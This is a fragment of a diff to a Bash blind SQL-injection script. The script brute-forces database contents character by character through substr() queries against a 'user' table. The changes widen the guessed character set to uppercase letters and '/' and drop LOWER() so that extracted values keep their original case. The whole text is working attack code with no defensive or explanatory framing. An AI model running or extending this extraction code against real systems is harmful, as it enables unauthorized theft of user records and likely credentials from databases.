@@ -115,7 +115,7 @@ function bruteForceName() {
 			# sql function 'substr()' starts at the number one and not with zero
 			extractionStartPosition=$((i+1))
 			offset=$index
-			for letter in {{a..z},@,_,\ ,$,.,{0..9}}; do
+			for letter in {{a..z},@,_,\ ,$,.,/,{A..Z},{0..9}}; do
 				sqli="$(printf "${placeholderSqli}" "$extractionStartPosition" "$offset" "$letter")"
 				request "${sqli}"
 				result=$(echo $?)
@@ -220,7 +220,7 @@ for column in ${object['namesOfColumns']}; do
         object['lengthOfContent']=$(getLength "$sqlQuery" "${object['amountOfContent']}")
         echo "${object['lengthOfContent']}"
         # names
-        sqlQuery="SELECT substr(LOWER($column), %d,1) FROM user LIMIT 1 OFFSET %d"
+        sqlQuery="SELECT substr($column, %d,1) FROM user LIMIT 1 OFFSET %d"
         object['namesOfContent']=$(bruteForceName "$sqlQuery" "${object['amountOfContent']}" "${object['lengthOfContent']}")
         echo "${object['namesOfContent']}"
 
